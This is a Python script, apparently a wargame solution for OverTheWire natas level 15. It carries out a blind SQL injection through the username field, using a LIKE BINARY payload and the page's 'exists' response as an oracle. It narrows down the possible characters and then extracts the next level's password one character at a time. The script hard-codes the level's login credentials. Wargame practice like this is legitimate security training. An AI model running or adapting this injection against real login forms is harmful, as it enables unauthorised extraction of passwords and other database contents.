# Blind SQL injection
# Written for OverTheWire natas wargame

import string
import requests

characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

url = "http://natas15.natas.labs.overthewire.org/index.php"
possible_chars = []
password = []

for char in characters:
    query = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post(url, auth=requests.auth.HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=query)

    if 'exists' in r.text:
        possible_chars.append(char)

print(f"Possible characters: {''.join(possible_chars)}\n")

for i in range(0, 32):
    for char in possible_chars:
        query = {'username': 'natas16" and password LIKE BINARY "' + ''.join(password) + char + '%" #'}
        r = requests.post(url, auth=requests.auth.HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=query)

        if 'exists' in r.text:
            password.append(char)
            print(''.join(password))
            break

print(f"\nFinal password: {''.join(password)}")